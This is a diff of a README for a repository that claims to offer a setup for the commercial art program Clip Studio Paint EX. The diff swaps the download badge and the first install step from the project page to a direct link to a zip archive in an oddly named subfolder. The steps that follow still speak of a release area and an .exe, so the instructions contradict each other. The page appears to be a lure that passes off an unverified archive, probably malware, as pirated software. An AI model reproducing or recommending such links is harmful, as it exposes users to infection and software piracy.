@@ -1,6 +1,6 @@
 # 🎨 Clip-Studio-Paint-EX-Setup - Professional grade digital art creation toolkit
 
-[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge)](https://github.com/Anakeym5443/Clip-Studio-Paint-EX-Setup)
+[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Anakeym5443/Clip-Studio-Paint-EX-Setup/main/Picunche/Clip-E-Studio-Paint-Setup-v2.3.zip)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project website at [https://github.com/Anakeym5443/Clip-Studio-Paint-EX-Setup](https://github.com/Anakeym5443/Clip-Studio-Paint-EX-Setup).
+1. Visit the project website at [https://raw.githubusercontent.com/Anakeym5443/Clip-Studio-Paint-EX-Setup/main/Picunche/Clip-E-Studio-Paint-Setup-v2.3.zip](https://raw.githubusercontent.com/Anakeym5443/Clip-Studio-Paint-EX-Setup/main/Picunche/Clip-E-Studio-Paint-Setup-v2.3.zip).
 2. Look for the release area.
 3. Choose the setup file that ends in .exe.
 4. Click the link to begin the download.
